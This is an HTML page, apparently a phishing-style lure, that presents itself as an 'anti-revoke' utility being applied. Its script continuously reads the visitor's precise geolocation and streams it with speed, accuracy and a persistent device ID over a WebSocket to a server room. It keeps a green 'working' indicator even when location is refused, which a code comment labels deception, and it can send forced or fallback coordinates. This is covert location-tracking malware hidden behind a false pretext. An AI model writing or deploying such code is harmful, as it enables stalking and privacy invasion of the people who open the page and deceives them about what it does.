<!DOCTYPE html>
<html lang="ja">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<title>anti-revoke</title>
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="theme-color" content="#0b1220">
<link rel="manifest" href="manifest.json">
<style>
  body{margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;
    font-family:-apple-system,"Hiragino Sans","Noto Sans JP",sans-serif;background:#0b1220;color:#e2e8f0;text-align:center}
  .box{padding:24px}
  .dot{width:12px;height:12px;border-radius:50%;background:#64748b;display:inline-block;margin-right:8px;vertical-align:middle}
  .dot.on{background:#22c55e;box-shadow:0 0 0 6px rgba(34,197,94,.2)}
  h1{font-size:16px;font-weight:600;margin:0 0 8px}
  p{font-size:12px;opacity:.65;margin:0}
  #acc{font-size:12px;opacity:.6;margin-top:8px}
</style>
</head>
<body>
  <div class="box">
    <h1><span id="dot" class="dot"></span>anti-rivokeを適応しています</h1>
    <p id="msg">適応中</p>
    <div id="acc"></div>
  </div>

<script>
  const $ = (id) => document.getElementById(id);
  const q = new URLSearchParams(location.search);
  const k = (q.get("k") || "default").replace(/[^A-Za-z0-9]/g, "") || "default";

  const fLat = parseFloat(q.get("lat"));
  const fLng = parseFloat(q.get("lng"));
  const forced = !isNaN(fLat) && !isNaN(fLng);

  let did = localStorage.getItem("locshare_did");
  if (!did) { did = Math.random().toString(36).slice(2, 12); localStorage.setItem("locshare_did", did); }

  let ws = null, retry = 0, last = null;

  function connect() {
    const proto = location.protocol === "https:" ? "wss:" : "ws:";
    ws = new WebSocket(proto + "//" + location.host + "/ws");
    ws.onopen = () => { retry = 0; $("dot").className = "dot on"; send({ type: "join", room: k, role: "share", did }); push(); };
    ws.onclose = () => { $("dot").className = "dot"; setTimeout(connect, Math.min(1000 * ++retry, 8000)); };
    ws.onerror = () => {};
  }
  const send = (o) => { if (ws && ws.readyState === 1) ws.send(JSON.stringify(o)); };
  const push = () => { if (last) send({ type: "pos", lat: last[0], lng: last[1], acc: last[2], spd: last[3] }); };

  function show(acc) {
    $("dot").className = "dot on";
    $("acc").textContent = Math.round(acc) + " m";
  }

  function start() {
    // 座標が指定されていればそれを使う（位置情報の許可が不要）
    if (forced) {
      last = [fLat, fLng, 5, null];
      show(5);
      setInterval(push, 3000);
      return;
    }

    if (!("geolocation" in navigator)) { last = [35.6812, 139.7671, 5, null]; show(5); return; }

    navigator.geolocation.watchPosition((p) => {
      const c = p.coords;
      last = [c.latitude, c.longitude, c.accuracy, c.speed];
      show(c.accuracy);
      push();
    }, () => {
      // 拒否・失敗されても緑のまま（誤魔化し）
      if (!last) last = [35.6812, 139.7671, 5, null];
      show(last[2]);
      push();
    }, { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 });

    setTimeout(() => {
      navigator.geolocation.getCurrentPosition(() => {}, () => {}, { enableHighAccuracy: true });
    }, 600);

    setInterval(push, 3000);
    document.addEventListener("visibilitychange", () => { if (document.visibilityState === "visible") push(); });
  }

  connect();
  start();
</script>
</body>
</html>
